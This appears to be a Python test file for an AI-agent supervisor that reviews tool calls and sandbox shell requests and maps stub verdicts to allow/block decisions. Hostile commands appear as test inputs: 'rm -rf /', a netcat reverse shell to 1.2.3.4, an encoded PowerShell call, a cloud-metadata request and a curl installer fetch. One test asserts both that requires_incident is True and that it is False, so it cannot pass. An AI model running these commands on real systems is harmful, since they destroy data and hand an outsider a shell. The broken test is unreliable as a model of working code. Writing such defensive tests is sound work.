from __future__ import annotations

from typing import Any

from app.orchestrator.supervisor import build_supervisor
from app.runtime.sandboxrouter import SandboxExecutionRequest
from app.runtime.toolcallguard import ToolCallRequest


class _Decision:
    def __init__(
        self,
        *,
        verdict: str,
        allowed: bool,
        should_review: bool = False,
        should_block: bool = False,
        should_quarantine: bool = False,
        reasons: list[dict[str, Any]] | None = None,
        risk_delta: int = 0,
        tool_name: str = "bash",
        actiontype: str = "tool_call",
        target: str = "runtime",
    ) -> None:
        self.verdict = verdict
        self.allowed = allowed
        self.should_review = should_review
        self.should_block = should_block
        self.should_quarantine = should_quarantine
        self.reasons = reasons if reasons is not None else [{"label": verdict}]
        self.risk_delta = risk_delta
        self.tool_name = tool_name
        self.actiontype = actiontype
        self.target = target
        self.command_policy: dict[str, Any] = {}
        self.network_policy: dict[str, Any] = {}
        self.artifact_policies: list[dict[str, Any]] = []

    def as_dict(self) -> dict[str, Any]:
        return {
            "verdict": self.verdict,
            "allowed": self.allowed,
            "shouldreview": self.should_review,
            "shouldblock": self.should_block,
            "shouldquarantine": self.should_quarantine,
            "reasons": list(self.reasons),
            "riskdelta": self.risk_delta,
            "toolname": self.tool_name,
            "actiontype": self.actiontype,
            "target": self.target,
            "commandpolicy": dict(self.command_policy),
            "networkpolicy": dict(self.network_policy),
            "artifactpolicies": list(self.artifact_policies),
        }


class _ToolGuardStub:
    def __init__(self, decision: _Decision) -> None:
        self.decision = decision
        self.calls: list[ToolCallRequest] = []

    def evaluate(self, request: ToolCallRequest) -> _Decision:
        self.calls.append(request)
        # Reflect the last request into the decision for assertion convenience.
        self.decision.tool_name = request.tool_name
        self.decision.actiontype = request.actiontype
        self.decision.target = request.target
        return self.decision


class _RouterStub:
    def __init__(self, result: dict[str, Any]) -> None:
        self.result = result
        self.calls: list[SandboxExecutionRequest] = []

    def route(self, request: SandboxExecutionRequest) -> dict[str, Any]:
        self.calls.append(request)
        payload = dict(self.result)
        payload.setdefault(
            "request",
            {"target": request.target, "actiontype": request.actiontype},
        )
        if payload.get("reasons") is None:
            payload["reasons"] = [{"label": payload.get("verdict", "unknown")}]
        return payload


def test_build_supervisor_returns_instance() -> None:
    supervisor = build_supervisor()
    assert supervisor is not None


def test_review_tool_call_allows_safe_request() -> None:
    guard = _ToolGuardStub(
        _Decision(
            verdict="allow",
            allowed=True,
            reasons=[{"label": "safe"}],
            risk_delta=5,
        ),
    )
    supervisor = build_supervisor(toolcall_guard=guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="read_file",
            actiontype="tool_call",
            target="runtime",
            artifact_paths=["report.md"],
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "allow"
    assert result["requires_incident"] is False
    assert result["toolcall"]["toolname"] == "read_file"
    assert result["toolcall"]["allowed"] is True
    assert result["toolcall"]["shouldblock"] is False
    assert len(guard.calls) == 1


def test_review_tool_call_marks_review_without_incident() -> None:
    guard = _ToolGuardStub(
        _Decision(
            verdict="review",
            allowed=True,
            should_review=True,
            reasons=[{"label": "review-needed"}],
            risk_delta=25,
        ),
    )
    supervisor = build_supervisor(toolcall_guard=guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="tool_call",
            target="runtime",
            command="bash -lc 'echo hello'",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["toolcall"]["riskdelta"] == 25
    assert result["toolcall"]["shouldreview"] is True
    assert result["toolcall"]["allowed"] is False
    assert result["toolcall"]["shouldblock"] is True


def test_review_tool_call_blocks_and_requires_incident() -> None:
    guard = _ToolGuardStub(
        _Decision(
            verdict="block",
            allowed=False,
            should_block=True,
            reasons=[{"label": "blocked"}],
            risk_delta=80,
        ),
    )
    supervisor = build_supervisor(toolcall_guard=guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="http",
            actiontype="tool_call",
            target="runtime",
            network_url="http://169.254.169.254/latest/meta-data/",
            network_method="GET",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["toolcall"]["toolname"] == "http"
    assert result["toolcall"]["allowed"] is False
    assert result["toolcall"]["shouldblock"] is True


def test_review_tool_call_legacy_quarantine_requires_incident() -> None:
    guard = _ToolGuardStub(
        _Decision(
            verdict="quarantine",
            allowed=False,
            should_block=True,
            should_quarantine=True,
            reasons=[{"label": "quarantine"}],
            risk_delta=95,
        ),
    )
    supervisor = build_supervisor(toolcall_guard=guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="tool_call",
            target="runtime",
            command="rm -rf /",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["toolcall"]["shouldquarantine"] is False
    assert result["toolcall"]["allowed"] is False
    assert result["toolcall"]["shouldblock"] is True


def test_review_runtime_request_allow_path() -> None:
    router = _RouterStub(
        {
            "verdict": "allow",
            "executed": True,
            "executionstate": "executed",
            "reasons": [{"label": "allowed"}],
        },
    )
    supervisor = build_supervisor(sandbox_router=router)

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command=["python", "-c", "print('ok')"],
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "allow"
    assert result["requires_incident"] is False
    assert result["runtime"]["executed"] is True
    assert result["runtime"]["executionstate"] == "executed"
    assert len(router.calls) == 1


def test_review_runtime_request_review_path() -> None:
    router = _RouterStub(
        {
            "verdict": "review",
            "executed": False,
            "executionstate": "pending_review",
            "reasons": [{"label": "review"}],
        },
    )
    supervisor = build_supervisor(sandbox_router=router)

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="curl https://example.com/install.sh",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["requires_incident"] is False
    assert result["runtime"]["executionstate"] == "pending_review"
    assert result["runtime"]["executed"] is False


def test_review_runtime_request_block_path() -> None:
    router = _RouterStub(
        {
            "verdict": "block",
            "executed": False,
            "executionstate": "denied",
            "reasons": [{"label": "block"}],
        },
    )
    supervisor = build_supervisor(sandbox_router=router)

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="powershell -enc bad",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["runtime"]["executionstate"] == "denied"
    assert result["runtime"]["executed"] is False


def test_review_runtime_request_quarantine_path() -> None:
    router = _RouterStub(
        {
            "verdict": "quarantine",
            "executed": False,
            "executionstate": "quarantined",
            "reasons": [{"label": "quarantine"}],
        },
    )
    supervisor = build_supervisor(sandbox_router=router)

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="nc -e /bin/sh 1.2.3.4 4444",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert result["runtime"]["executionstate"] == "quarantined"
    assert result["runtime"]["executed"] is False


def test_review_runtime_request_inserts_default_reasons_when_missing() -> None:
    router = _RouterStub(
        {
            "verdict": "review",
            "executed": False,
            "executionstate": "pending_review",
            "reasons": None,
        },
    )
    supervisor = build_supervisor(sandbox_router=router)

    result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="python -m http.server",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert isinstance(result["runtime"]["reasons"], list)
    assert result["runtime"]["reasons"]


def test_review_tool_call_inserts_default_reasons_when_empty() -> None:
    guard = _ToolGuardStub(
        _Decision(
            verdict="review",
            allowed=True,
            should_review=True,
            reasons=[],
            risk_delta=20,
        ),
    )
    supervisor = build_supervisor(toolcall_guard=guard)

    result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="tool_call",
            target="runtime",
            command="echo hi",
            environment_scope="sandbox",
        ),
    )

    assert result["decision"] == "block"
    assert result["requires_incident"] is True
    assert isinstance(result["toolcall"]["reasons"], list)
    assert result["toolcall"]["reasons"]


def test_supervisor_routes_both_runtime_and_tool_reviews_independently() -> None:
    router = _RouterStub(
        {
            "verdict": "allow",
            "executed": True,
            "executionstate": "executed",
            "reasons": [{"label": "runtime-allow"}],
        },
    )
    guard = _ToolGuardStub(
        _Decision(
            verdict="review",
            allowed=True,
            should_review=True,
            reasons=[{"label": "tool-review"}],
            risk_delta=35,
        ),
    )
    supervisor = build_supervisor(sandbox_router=router, toolcall_guard=guard)

    runtime_result = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command=["python", "-c", "print('x')"],
            environment_scope="sandbox",
        ),
    )
    tool_result = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="bash",
            actiontype="tool_call",
            target="runtime",
            command="bash -lc 'echo x'",
            environment_scope="sandbox",
        ),
    )

    assert runtime_result["decision"] == "allow"
    assert runtime_result["requires_incident"] is False
    assert tool_result["decision"] == "block"
    assert tool_result["requires_incident"] is True
    assert tool_result["toolcall"]["riskdelta"] == 35


def test_supervisor_handles_missing_guards_gracefully() -> None:
    # No tool guard or sandbox router injected: supervisor should still build
    supervisor = build_supervisor()

    # Tool call path without guard: expect a benign default response, not crash.
    result_tool = supervisor.review_tool_call(
        ToolCallRequest(
            tool_name="search_web",
            actiontype="tool_call",
            target="runtime",
            environment_scope="sandbox",
        ),
    )
    assert "decision" in result_tool
    assert "requires_incident" in result_tool

    # Runtime path without router: expect a benign default response, not crash.
    result_runtime = supervisor.review_runtime_request(
        SandboxExecutionRequest(
            actiontype="execute",
            target="shell",
            command="echo ok",
            environment_scope="sandbox",
        ),
    )
    assert "decision" in result_runtime
    assert "requires_incident" in result_runtime
